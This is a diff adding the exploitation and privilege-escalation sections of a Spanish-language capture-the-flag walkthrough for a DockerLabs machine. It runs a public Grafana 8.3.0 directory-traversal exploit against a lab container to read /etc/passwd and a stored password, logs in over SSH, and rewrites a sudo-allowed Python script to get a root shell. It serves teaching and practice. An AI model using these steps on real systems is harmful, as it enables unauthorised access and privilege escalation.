@@ -148,6 +148,97 @@ Probamos a ver si encontramos algo en la página **/maintenance.html**, que es l
 
 Cómo no vemos nada más en el puerto 80, vamos a ver que encontramos en el puerto 3000, y nos encontramos con un panel de login de Grafana v8.3.0.
 
+![grafana](https://github.com/TBrux/DOCKERLABS/assets/168732212/1d77444d-d660-4e2c-b079-4b5047c181f2)
+
+## Explotación.
+Vamos a comprobar si hay alguna exploit para esta versión de grafana.
+```bash
+❯ searchsploit grafana 8.3.0
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                            |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                                                               | multiple/webapps/50581.py
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+Ahora nos descargamos el exploit a nuestro ordenador.
+```bash
+searchsploit -m multiple/webapps/50581.py
+```
+```
+❯ python3 50581.py -H http://172.17.0.2:3000
+Read file > /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
+grafana:x:103:105::/usr/share/grafana:/bin/false
+freddy:x:1000:1000::/home/freddy:/bin/bash
+```
+Vemos que el exploit nos permite leer archivos del sistema y recordemos que en el puerto 80 nos ponía una ruta para visitar **/tmp/pass.txt**.
+```
+Read file > /tmp/pass.txt
+t9sH76gpQ82UFeZ3GXZS
+```
+Ahora mismo tenemos una contraseña y cuando hemos leído el **/etc/passwd** había un usuario llamado **freddy**, así que podemos probar a conectarnos por **ssh** con estas credenciales.
+```bash
+ssh freddy@172.17.0.2
+```
+Efectivamente, con estas credenciales tenemos acceso por ssh al usuario freddy.
+```
+┌──(freddy㉿2742d7ddff34)-[~]
+└─$ whoami                                                                                                                                                                                                                                 
+freddy
+```
+## Escalada de privilegios.
+Una vez dentro, empezamos con la escalada de privilegios viendo si tenemos algún archivo que podemos utilizar con permisos de root desde el usuario **freddy**.
+```
+┌──(freddy㉿2742d7ddff34)-[~]
+└─$ sudo -l                                                                                                                                                                                                                                
+Matching Defaults entries for freddy on 2742d7ddff34:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User freddy may run the following commands on 2742d7ddff34:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
+
+```
+```
+──(freddy㉿2742d7ddff34)-[~]
+└─$ ll /opt/maintenance.py 
+-rw-r--r-- 1 freddy freddy 35 Mar 29 09:29 /opt/maintenance.py
+```
+Vemos que somos el propietario del archivo, así que vamos a cambiar el contenido del script para lanzar una bash como el usuario **root**.
+```python
+import os
+os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")
+```
+Una vez modificado el script de python, lo ejecutamos y ya tenemos una bash como **root**.
+```
+┌──(freddy㉿2742d7ddff34)-[~]
+└─$ sudo -u root /usr/bin/python3 /opt/maintenance.py 
+┌──(root㉿2742d7ddff34)-[/home/freddy]
+└─# whoami
+root
+```
 
 
 
